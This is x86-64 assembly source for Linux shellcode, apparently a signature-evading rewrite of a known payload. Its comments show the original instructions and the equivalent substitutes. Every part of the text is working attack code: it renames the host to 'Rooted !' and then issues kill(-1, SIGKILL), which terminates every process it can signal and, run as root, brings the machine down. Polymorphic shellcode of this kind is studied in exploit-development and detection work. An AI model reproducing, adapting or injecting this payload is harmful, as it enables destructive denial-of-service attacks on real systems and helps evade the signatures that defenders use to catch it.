global _start

section .text

_start:

        jmp real_start
        string: db "Rooted !"

real_start:

        ;-- setHostName("Rooted !"); 22 bytes --;
        ;mov     al, 0xaa
        ; RAX needs the 0xaa value.
        ; 1.- First RAX will take value 70
        ; 2.- Value 100 is added to rax
        ; 3.- RDX is used to pur some garbage in the shellcode
        push 70
        pop rax
        cdq                        ; Garbage (1 byte
        push 100
        pop rdx
        add rax, rdx

        ; Let's define a string and use Relative Addressing
        ;mov     r8, 'Rooted !'
        ;push    r8
        ;mov     rdi, rsp
        lea rdi, [rel string]

        ;mov     sil, 0x8
        push 0x08
        pop rsi

        syscall

        ;-- kill(-1, SIGKILL); 11 bytes --;
        push    byte 0x3e
        pop     rax
        
        ; Let's push 0xc1 into RDI
        ; Then add RAX to RDI
        ; 0xff = 0x3e + 0xc1
        ;push    byte 0xff
        ;pop     rdi
        push byte 0xc1
        pop rdi
        add rdi, rax                    ; RAX already has 0x3e value

        ; RSI comes with a 0x08 value from previous code
        ; Just need to Inc it to get the 0x09 value
        ;push    byte 0x9
        ;pop     rsi
        inc rsi                         ; RSI has value 0x8 from previous
                                        ;  syscall, then can increment 1
                                        ;  to get the same value of 0x9
        syscall